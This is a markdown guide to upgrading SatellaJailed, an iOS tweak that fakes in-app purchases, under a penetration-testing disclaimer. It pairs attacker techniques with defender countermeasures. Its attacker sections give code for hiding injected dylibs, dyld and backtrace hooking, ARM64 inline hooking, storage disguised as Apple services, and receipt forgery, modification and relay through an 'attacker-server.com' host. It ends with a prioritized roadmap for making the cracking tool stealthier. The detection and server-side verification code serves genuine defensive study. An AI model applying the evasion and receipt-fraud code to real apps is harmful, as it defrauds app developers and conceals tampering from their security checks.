# SatellaJailed Modernization Guide (2026)

## For Educational/Penetration Testing Purposes Only

**Disclaimer:** This document is for security research, penetration testing, and educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.

---

## Part 1: Current Architecture Analysis

### What SatellaJailed Does Now

```
┌─────────────────────────────────────────────────────────┐
│  Injection: Dylib in Frameworks/ via Azula/eSign        │
│  Entry: jinx_entry() → Tweak.ctor()                     │
│  Hooks:                                                 │
│    • SKPaymentTransaction.transactionState → .purchased │
│    • SKPaymentTransaction.transactionReceipt → forged   │
│    • SKProduct.price → 0.01                             │
│    • _dyld_get_image_name → returns libcrane.dylib      │
│  Storage: UserDefaults (tella_* keys)                   │
│  UI: Floating star button (iOS 15+)                     │
└─────────────────────────────────────────────────────────┘
```

### Why Current Version Is Easily Detected

1. **File System Artifacts**
   - `SatellaJailed.dylib` visible in bundle
   - Added `LC_LOAD_DYLIB` in Mach-O header
   - Code signature includes new framework

2. **Runtime Artifacts**
   - Only hooks `_dyld_get_image_name`
   - `_dyld_image_count()` still returns inflated count
   - `_dyld_get_image_header(i)` exposes injected image
   - Method IMPs changed (visible via `class_getMethodImplementation`)

3. **Storage Artifacts**
   - `tella_isEnabled`, `tella_isGesture`, etc. in UserDefaults
   - Trivial to scan: `UserDefaults.standard.dictionaryRepresentation().keys`

4. **Receipt Artifacts**
   - Hardcoded signature (same bytes for every forgery)
   - No valid cryptographic chain
   - Server-side verification will fail

5. **Behavioral Artifacts**
   - All purchases succeed instantly
   - No network traffic to Apple's receipt validation
   - Transaction IDs are random UUIDs (not Apple's format)

---

## Part 2: Modern Stealth Architecture

### 2.1 Injection Without Visible Dylib

#### Approach A: Inline Binary Patching

Instead of adding a dylib, patch the app's main binary directly:

```swift
// Conceptual - requires Mach-O parsing
// 1. Parse __TEXT segment of main executable
// 2. Find unused padding or extend __TEXT
// 3. Insert hook code directly
// 4. Patch original function prologues to jump to injected code
// 5. No additional LC_LOAD_DYLIB needed
```

**Detection countermeasure:**
- Hash main executable at runtime, compare to known-good value
- Check `LC_LOAD_DYLIB` count matches build-time expectation

#### Approach B: LC_LOAD_DYLIB Header Stripping

```c
// After loading, strip the load command
// This requires:
// 1. Get mach_header of current process
// 2. Find LC_LOAD_DYLIB command pointing to SatellaJailed
// 3. Overwrite with LC_NOTE or nop out
// 4. Flush instruction cache

// Pseudocode:
struct mach_header_64 *header = (struct mach_header_64 *)_dyld_get_image_header(0);
struct load_command *cmd = (struct load_command *)(header + 1);
for (uint32_t i = 0; i < header->ncmds; i++) {
    if (cmd->cmd == LC_LOAD_DYLIB) {
        struct dylib_command *dc = (struct dylib_command *)cmd;
        const char *name = (char *)dc + dc->dylib.name.offset;
        if (strstr(name, "SatellaJailed")) {
            // Zero out or change to LC_NOTE
            memset(cmd, 0, cmd->cmdsize);
            header->ncmds--;
        }
    }
    cmd = (struct load_command *)((char *)cmd + cmd->cmdsize);
}
```

**Detection countermeasure:**
- Store expected `ncmds` at compile time
- Compare binary size on disk vs. in memory

#### Approach C: Merge Into Existing Framework

Instead of new dylib, append code to an existing framework the app already loads:

```bash
# Conceptual workflow:
# 1. Choose framework already in Frameworks/ (e.g., app's own helper)
# 2. Append new __TEXT segment with hook code
# 3. Add export symbol for entry point
# 4. Update code signature
# Result: No new file, just modified existing one
```

**Detection countermeasure:**
- Hash each framework at runtime
- Compare against known-good hashes from build time or server

---

### 2.2 Comprehensive Dyld Enumeration Hooking

Current Satella only hooks `_dyld_get_image_name`. A modern version must hook the entire surface:

```swift
struct ModernDyldHooks {
    // Hook all dyld image enumeration
    static let dyld_image_count = hook(
        "_dyld_image_count",
        implementation: { () -> UInt32 in
            let realCount = orig_dyld_image_count()
            // Subtract injected dylibs
            return realCount - injectedDylibCount
        }
    )
    
    static let dyld_get_image_name = hook(
        "_dyld_get_image_name",
        implementation: { (index: UInt32) -> UnsafePointer<Int8>? in
            var adjustedIndex = index
            // Skip over injected indices
            for injectedIndex in injectedIndices where injectedIndex <= adjustedIndex {
                adjustedIndex += 1
            }
            return orig_dyld_get_image_name(adjustedIndex)
        }
    )
    
    static let dyld_get_image_header = hook(
        "_dyld_get_image_header",
        implementation: { (index: UInt32) -> UnsafePointer<mach_header>? in
            // Same index adjustment as above
        }
    )
    
    static let dyld_get_image_vmaddr_slide = hook(
        "_dyld_get_image_vmaddr_slide",
        implementation: { (index: UInt32) -> Int in
            // Same index adjustment
        }
    )
    
    // Also hook dladdr for backtrace hiding
    static let dladdr = hook(
        "dladdr",
        implementation: { (addr, info) -> Int32 in
            let result = orig_dladdr(addr, info)
            // If addr is in injected range, return 0 (not found)
            if isAddressInInjectedRange(addr) {
                return 0
            }
            return result
        }
    )
    
    // Hook backtrace_symbols for completeness
    static let backtrace_symbols = hook(
        "backtrace_symbols",
        implementation: { (buffer, size) -> UnsafeMutablePointer<UnsafeMutablePointer<Int8>?>? in
            let symbols = orig_backtrace_symbols(buffer, size)
            // Filter out injected dylib paths from symbol strings
            return filterInjectedSymbols(symbols, size)
        }
    )
}
```

**Detection countermeasure (for defenders):**
```swift
// Cross-reference multiple enumeration methods
func detectDyldHooking() -> Bool {
    let dyldCount = _dyld_image_count()
    
    // Method 1: task_info
    var taskInfo = task_dyld_info()
    var count = mach_msg_type_number_t(MemoryLayout<task_dyld_info>.size / MemoryLayout<integer_t>.size)
    let result = task_info(mach_task_self_, TASK_DYLD_INFO, &taskInfo, &count)
    let taskInfoCount = Int(taskInfo.images_count)
    
    // Method 2: /proc filesystem (if available)
    // Method 3: sysctl
    
    // Inconsistency = hooking detected
    if dyldCount != taskInfoCount {
        return true // Hooking detected
    }
    
    return false
}
```

---

### 2.3 Stealthier Hooking: Inline vs. Swizzling

#### Current Approach: Method Swizzling (Detectable)

```swift
// Jinx does swizzling - changes IMP
struct TransactionHook: HookGroup {
    let sel0 = #selector(getter: SKPaymentTransaction.transactionState)
    let replace0: T0 = { _, _ in .purchased }  // New IMP
}
// Detection: class_getMethodImplementation(sel) != original IMP
```

#### Modern Approach: Inline Hooking

```c
// Overwrite function prologue with jump instruction
// Objective-C runtime still shows original IMP, but code jumps elsewhere

void inline_hook(void *target, void *replacement) {
    // ARM64: Write branch instruction at target
    // B <offset> = 0x14000000 | ((offset / 4) & 0x03FFFFFF)
    
    uint32_t *target_ptr = (uint32_t *)target;
    int64_t offset = (int64_t)replacement - (int64_t)target;
    
    // Save original bytes for unhooking
    memcpy(original_bytes, target_ptr, sizeof(uint32_t) * 4);
    
    // Write trampoline
    target_ptr[0] = 0x14000000 | ((offset / 4) & 0x03FFFFFF);  // B
    target_ptr[1] = 0xD65F03C0;  // RET (padding)
    target_ptr[2] = 0xD503201F;  // NOP (padding)
    target_ptr[3] = 0xD503201F;  // NOP (padding)
    
    // Flush instruction cache
    sys_icache_invalidate(target, sizeof(uint32_t) * 4);
}
```

**Detection countermeasure:**
```swift
func detectInlineHooking() -> Bool {
    // Check if function starts with branch instruction
    let funcPtr = unsafeBitCast(SKPaymentTransaction.transactionState, to: UnsafePointer<UInt32>.self)
    let firstInstruction = funcPtr.pointee
    
    // ARM64 branch: 0x14xxxxxx
    if (firstInstruction & 0xFC000000) == 0x14000000 {
        // Check if branch target is within StoreKit framework
        let branchOffset = Int(Int32(firstInstruction & 0x03FFFFFF)) * 4
        let targetAddress = UInt(bitPattern: funcPtr) + UInt(branchOffset)
        
        if !isAddressInFramework(targetAddress, "StoreKit") {
            return true // Inline hook detected
        }
    }
    
    return false
}
```

---

### 2.4 Covert Configuration Storage

#### Current: Obvious UserDefaults Keys

```swift
// Current - trivially detectable
UserDefaults.standard.object(forKey: "tella_isEnabled")
UserDefaults.standard.object(forKey: "tella_isStealth")
```

#### Modern: Multiple Covert Channels

```swift
enum CovertStorage {
    // Option 1: Encoded UserDefaults keys
    static func getPreference(_ key: String) -> Bool {
        // Hash the key to look like legitimate app data
        let hashedKey = SHA256.hash("com.legitimate.analytics.\(key)")
            .base64EncodedString()
            .replacingOccurrences(of: "/", with: "_")
        return UserDefaults.standard.bool(forKey: hashedKey)
    }
    
    // Option 2: Mach-O custom section
    static func readFromBinary() -> [UInt8] {
        // Read from __CUSTOM,__config section
        var size: UInt = 0
        if let ptr = getsectiondata(
            _dyld_get_image_header(0),
            "__CUSTOM",
            "__config",
            &size
        ) {
            return Data(bytes: ptr, count: Int(size)).bytes
        }
        return []
    }
    
    // Option 3: Keychain with generic service name
    static func readFromKeychain() -> Data? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: "com.apple.security.identity",  // Looks legitimate
            kSecReturnData as String: true
        ]
        var result: AnyObject?
        SecItemCopyMatching(query as CFDictionary, &result)
        return result as? Data
    }
    
    // Option 4: Extended file attributes
    static func readFromXAttr() -> Data? {
        let appPath = Bundle.main.bundlePath
        var size = getxattr(appPath, "com.apple.quarantine", nil, 0, 0, 0)
        if size > 0 {
            var buffer = Data(count: size)
            return buffer.withUnsafeMutableBytes { ptr in
                getxattr(appPath, "user.config", ptr.baseAddress, size, 0, 0)
                return ptr.bindMemory(to: Data.self).pointee
            }
        }
        return nil
    }
    
    // Option 5: Environmental signals (no storage)
    static func detectFromEnvironment() -> Bool {
        // Presence of specific file = enable stealth
        let fm = FileManager.default
        return fm.fileExists(atPath: "/var/tmp/.cache/com.apple.fonts")
    }
}
```

**Detection countermeasure:**
```swift
func scanForCovertStorage() -> [String] {
    var findings: [String] = []
    
    // Scan UserDefaults for suspicious keys
    let allKeys = UserDefaults.standard.dictionaryRepresentation().keys
    for key in allKeys {
        // Check for high-entropy keys (likely encoded)
        if key.count > 32 && key.entropy() > 4.0 {
            findings.append("High-entropy UserDefaults key: \(key)")
        }
        
        // Check for keys mimicking Apple services
        if key.contains("apple") && !key.contains("com.yourapp") {
            findings.append("Suspicious Apple-mimicking key: \(key)")
        }
    }
    
    // Scan Keychain for your app's access group
    // (Implementation depends on your app's keychain access)
    
    // Scan extended attributes
    let appPath = Bundle.main.bundlePath
    var xattrList = [CChar](repeating: 0, count: 128)
    let xattrCount = listxattr(appPath, &xattrList, 128, 0)
    if xattrCount > 0 {
        // Check for non-standard xattrs
    }
    
    return findings
}
```

---

### 2.5 Advanced Receipt Forgery

#### Current: Hardcoded Invalid Signature

```swift
// Current - always the same invalid signature
private static let signature: [UInt8] = [0x03, 0x42, 0xFB, ...]  // 1000+ bytes
```

#### Modern: Multiple Approaches

```swift
enum ModernReceiptApproaches {
    // Approach 1: Signature Verification Bypass
    // Instead of forging, hook the verification to always succeed
    struct ReceiptVerificationBypass {
        static func hook() {
            // Hook SKReceiptRefreshRequest or server-side verification
            // Return success regardless of actual receipt
            hook("_SKReceiptVerifyWithData", implementation: { data, status in
                return 0  // Success
            })
        }
    }
    
    // Approach 2: Receipt Relay Server
    // Don't forge locally - use real receipts from legitimate purchases
    struct ReceiptRelay {
        static func requestReceipt(productID: String) async -> Data? {
            // Relay to attacker-controlled server
            // Server has pool of legitimate receipts to replay
            let serverURL = URL(string: "https://attacker-server.com/receipt/\(productID)")
            return try? Data(from: serverURL)
        }
    }
    
    // Approach 3: Partial Receipt Reuse
    // Buy cheapest item legitimately, modify product_id
    struct ReceiptModifier {
        static func modifyReceipt(_ receipt: Data, newProductID: String) -> Data? {
            // Parse receipt JSON
            guard var json = try? JSONSerialization.jsonObject(with: receipt) as? [String: Any],
                  var inApp = json["in_app"] as? [[String: Any]] else {
                return nil
            }
            
            // Modify first in-app purchase
            if var firstItem = inApp.first {
                firstItem["product_id"] = newProductID
                inApp[0] = firstItem
                json["in_app"] = inApp
                
                return try? JSONSerialization.data(withJSONObject: json)
            }
            return nil
        }
    }
    
    // Approach 4: Server-Side Validation Exploitation
    // Many servers don't validate receipt-to-product binding
    struct ServerExploit {
        static func exploitWeakValidation() {
            // Buy $0.99 item, get valid receipt
            // Send receipt to game server claiming $99.99 item
            // Server only checks "receipt is valid" not "receipt matches product"
        }
    }
}
```

**Detection countermeasure:**
```swift
func validateReceiptServerSide(receiptData: Data, expectedProductID: String) async -> Bool {
    // NEVER trust client-side verification
    // Always verify server-to-server with Apple
    
    let verifyURL = URL(string: "https://buy.itunes.apple.com/verifyReceipt")!
    var request = URLRequest(url: verifyURL)
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    
    let body = ["receipt-data": receiptData.base64EncodedString()]
    request.httpBody = try? JSONSerialization.data(withJSONObject: body)
    
    let (data, _) = try? await URLSession.shared.data(for: request)
    guard let response = try? JSONSerialization.jsonObject(with: data!) as? [String: Any],
          let status = response["status"] as? Int,
          status == 0 else {
        return false
    }
    
    // Critical: Verify product_id in receipt matches expected
    guard let receiptInfo = response["receipt"] as? [String: Any],
          let inApp = receiptInfo["in_app"] as? [[String: Any]],
          let lastPurchase = inApp.last,
          let productID = lastPurchase["product_id"] as? String else {
        return false
    }
    
    if productID != expectedProductID {
        // Receipt tampering detected!
        logSecurityEvent("Receipt product mismatch: expected \(expectedProductID), got \(productID)")
        return false
    }
    
    // Verify bundle_id matches
    if let bundleID = receiptInfo["bundle_id"] as? String,
       bundleID != Bundle.main.bundleIdentifier {
        logSecurityEvent("Receipt bundle_id mismatch")
        return false
    }
    
    return true
}
```

---

### 2.6 Anti-Analysis / Anti-Debug

```swift
struct AntiAnalysis {
    // Detect debuggers
    static func isDebuggerAttached() -> Bool {
        var info = kinfo_proc()
        var size = MemoryLayout<kinfo_proc>.stride
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
        
        sysctl(&mib, UInt32(mib.count), &info, &size, nil, 0)
        return (info.kp_proc.p_flag & P_TRACED) != 0
    }
    
    // Detect Frida
    static func detectFrida() -> Bool {
        // Check for frida-gadget port
        let sock = socket(AF_INET, SOCK_STREAM, 0)
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = UInt16(27042).bigEndian  // Frida default port
        addr.sin_addr = in_addr(s_addr: in_addr_t(0x7F000001))  // 127.0.0.1
        
        if connect(sock, sockaddr_cast(&addr), MemoryLayout<sockaddr_in>.size) == 0 {
            close(sock)
            return true
        }
        close(sock)
        
        // Check for frida-agent in loaded images
        for i in 0..<_dyld_image_count() {
            if let name = _dyld_get_image_name(i),
               String(cString: name).contains("frida") {
                return true
            }
        }
        
        return false
    }
    
    // Detect jailbreak (basic)
    static func detectJailbreak() -> Bool {
        let paths = [
            "/Applications/Cydia.app",
            "/Library/MobileSubstrate/MobileSubstrate.dylib",
            "/bin/bash",
            "/usr/sbin/sshd",
            "/etc/apt"
        ]
        
        for path in paths {
            if FileManager.default.fileExists(atPath: path) {
                return true
            }
        }
        
        // Check for fork (fails on non-jailbroken)
        let pid = fork()
        if pid == 0 {
            exit(0)  // Child process
        } else if pid > 0 {
            waitpid(pid, nil, 0)
            return false  // Fork succeeded = jailbroken
        }
        
        return false
    }
    
    // Timing-based breakpoint detection
    static func detectBreakpoints() -> Bool {
        let start = mach_absolute_time()
        
        // Execute some computation
        var sum: UInt64 = 0
        for i in 0..<1000000 {
            sum += i
        }
        
        let elapsed = mach_absolute_time() - start
        
        // If elapsed time is suspiciously long, breakpoint might be hit
        if elapsed > expectedTime * 2 {
            return true
        }
        
        return false
    }
}
```

---

### 2.7 App Attest Evasion

App Attest is the hardest obstacle. It uses the Secure Enclave to prove app integrity.

```swift
enum AppAttestApproaches {
    // Approach 1: Target the Fallback
    // Most apps have "what if attestation fails" path
    struct FallbackExploit {
        static func exploit() {
            // Force attestation to fail (network block, etc.)
            // App falls back to permissive mode
            // Exploit the permissive fallback
        }
    }
    
    // Approach 2: Relay Attack
    // Run clean app alongside tampered one
    struct RelayAttack {
        static func relayAttestation() async -> Data? {
            // Tampered app generates challenge
            // Relay challenge to clean app (different device/process)
            // Clean app generates valid attestation
            // Relay response back to tampered app
            // Timing anomaly might be detectable
        }
    }
    
    // Approach 3: Server-Side Validation Weakness
    // Server doesn't properly validate attestation response
    struct ServerValidationExploit {
        static func exploit() {
            // Generate attestation with tampered app
            // Server should verify:
            //   1. Attestation is from Apple
            //   2. App ID matches
            //   3. Challenge matches
            //   4. Public key matches previous attestations
            // Many servers skip #4 or do weak validation
        }
    }
}
```

**Detection countermeasure:**
```swift
func implementRobustAppAttest() async -> Bool {
    // 1. Make fallback restrictive, not permissive
    // If attestation fails, limit functionality, don't grant full access
    
    // 2. Bind attestation to specific actions
    // Don't just attest at launch - re-attest before critical operations
    
    // 3. Detect relay timing anomalies
    let start = Date()
    let attestationResult = await performAppAttest()
    let elapsed = Date().timeIntervalSince(start)
    
    if elapsed > expectedAttestationTime + threshold {
        // Might be relay attack
        logSecurityEvent("Attestation took suspiciously long: \(elapsed)s")
        return false
    }
    
    // 4. Validate full certificate chain
    // 5. Bind attestation to device-specific keys
    // 6. Rate limit attestation attempts
    
    return attestationResult.isValid
}
```

---

## Part 3: Defender's Detection Checklist

### Runtime Detection

```swift
class SecurityScanner {
    func runAllChecks() -> SecurityReport {
        var report = SecurityReport()
        
        report.dyldHooking = detectDyldHooking()
        report.inlineHooking = detectInlineHooking()
        report.impSwizzling = detectIMPChanges()
        report.covertStorage = scanForCovertStorage()
        report.debugger = isDebuggerAttached()
        report.frida = detectFrida()
        report.jailbreak = detectJailbreak()
        report.binaryModified = isBinaryModified()
        report.receiptInvalid = isReceiptInvalid()
        
        return report
    }
    
    func detectDyldHooking() -> Bool {
        // Cross-reference _dyld_* with task_info
    }
    
    func detectInlineHooking() -> Bool {
        // Check function prologues for branch instructions
    }
    
    func detectIMPChanges() -> Bool {
        // Snapshot IMPs at launch, compare periodically
    }
    
    func scanForCovertStorage() -> [String] {
        // Scan UserDefaults, Keychain, xattrs
    }
    
    func isBinaryModified() -> Bool {
        // Hash binary, compare to known-good
    }
    
    func isReceiptInvalid() -> Bool {
        // Server-side verification
    }
}
```

### Server-Side Detection

```python
class ServerSideDetection:
    def detect_fraud(self, transaction_data: dict) -> FraudAlert:
        alerts = []
        
        # 1. Verify receipt with Apple
        apple_response = self.verify_with_apple(transaction_data['receipt'])
        if apple_response['status'] != 0:
            alerts.append('INVALID_RECEIPT')
        
        # 2. Check product_id binding
        if apple_response['product_id'] != transaction_data['expected_product']:
            alerts.append('PRODUCT_MISMATCH')
        
        # 3. Check transaction ID deduplication
        if self.transaction_exists(transaction_data['transaction_id']):
            alerts.append('REPLAY_ATTACK')
        
        # 4. Check timing anomalies
        if self.time_since_purchase() < verification_latency_threshold:
            alerts.append('TIMING_ANOMALY')
        
        # 5. Check refund status
        if self.is_refunded(transaction_data['transaction_id']):
            alerts.append('REFUNDED_PURCHASE')
        
        # 6. Behavioral analysis
        if self.player_currency_balance() > legitimate_earnings_cap:
            alerts.append('ECONOMIC_ANOMALY')
        
        return FraudAlert(alerts)
```

---

## Part 4: Implementation Priority

### For Attackers (Modernizing Satella)

| Priority | Technique | Effort | Detection Evasion |
|----------|-----------|--------|-------------------|
| 1 | Comprehensive dyld hooking | Low | Evades basic enumeration |
| 2 | Covert storage (encoded keys) | Low | Evades UserDefaults scan |
| 3 | Inline hooking | Medium | Evades IMP introspection |
| 4 | LC_LOAD_DYLIB stripping | Medium | Evades static analysis |
| 5 | Receipt verification bypass | Medium | Evades signature check |
| 6 | Anti-debug/analysis | High | Evades dynamic analysis |
| 7 | App Attest relay | Very High | Evades hardware attestation |

### For Defenders (Building Detection)

| Priority | Technique | Effort | Catch Rate |
|----------|-----------|--------|------------|
| 1 | Server-authoritative state | High | ~95% |
| 2 | App Attest (proper impl) | Medium | ~90% |
| 3 | Binary integrity checks | Low | ~70% |
| 4 | Cross-reference dyld methods | Low | ~60% |
| 5 | IMP snapshotting | Low | ~50% |
| 6 | Behavioral analysis | Medium | ~80% |
| 7 | Jailbreak detection | Low | ~30% (easily bypassed) |

---

## Part 5: Recommended Next Steps

### For Your Penetration Testing Tool

1. **Start with dyld enumeration hardening**
   - Hook all `_dyld_*` functions
   - Hook `dladdr`, `backtrace_symbols`
   - Test against common detection methods

2. **Implement covert storage**
   - Replace `tella_*` keys with encoded versions
   - Add Mach-O section storage option
   - Add environmental detection option

3. **Upgrade hooking technique**
   - Implement inline hooking alongside swizzling
   - Add detection for which method is safer per target

4. **Improve receipt handling**
   - Add verification bypass mode
   - Add relay server capability
   - Add receipt modification mode

5. **Add anti-analysis**
   - Basic debugger detection
   - Frida detection
   - Timing-based breakpoint detection

### For Defender Training

1. **Build detection scanner**
   - Implement all checks from Part 3
   - Create test harness with known-modified binaries
   - Measure false positive rate

2. **Server-side hardening**
   - Implement proper receipt verification
   - Add transaction deduplication
   - Add behavioral anomaly detection

3. **App Attest integration**
   - Follow Apple's documentation exactly
   - Implement restrictive fallback
   - Add re-attestation for critical actions

---

## Resources

- [Apple App Attest Documentation](https://developer.apple.com/documentation/devicecheck/attesting_apps_with_devicecheck_app_attest)
- [StoreKit Verification Best Practices](https://developer.apple.com/documentation/storekit/in-app_purchase/verifying_receipts)
- [Mach-O Runtime Security](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Introduction/Introduction.html)
- [iOS Reverse Engineering](https://github.com/abhi-r7/awesome-ios-reverse-engineering)

---

**Remember:** This is for educational and authorized penetration testing only. Always obtain proper authorization before testing any system you don't own.
